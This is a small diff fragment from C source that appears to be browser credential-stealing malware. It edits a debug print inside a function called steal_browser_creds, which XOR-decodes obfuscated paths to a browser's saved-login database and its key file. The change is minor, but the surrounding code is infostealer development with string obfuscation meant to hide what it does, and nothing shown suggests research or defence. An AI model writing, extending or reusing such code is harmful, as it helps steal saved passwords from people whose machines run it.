@@ -186,8 +186,8 @@ static int steal_browser_creds(BrowserInfo browser) {
   XOR_WSTR(browser.loginDataPath, wcslen(browser.loginDataPath));
   XOR_WSTR(browser.localStatePath, wcslen(browser.localStatePath));
 #ifdef DEBUG
-  wprintf(L"Values : %ls, %ls, %ls\n", browser.browserName,
-          browser.loginDataPath, browser.localStatePath);
+  wprintf(L"steal_browser-creds - Values after XOR : %ls, %ls, %ls\n",
+          browser.browserName, browser.loginDataPath, browser.localStatePath);
 #endif
   wprintf(L"Browser name = %ls\n", browser.browserName);
   // wprintf(L"Login data path = %ls\n", browser.loginDataPath);
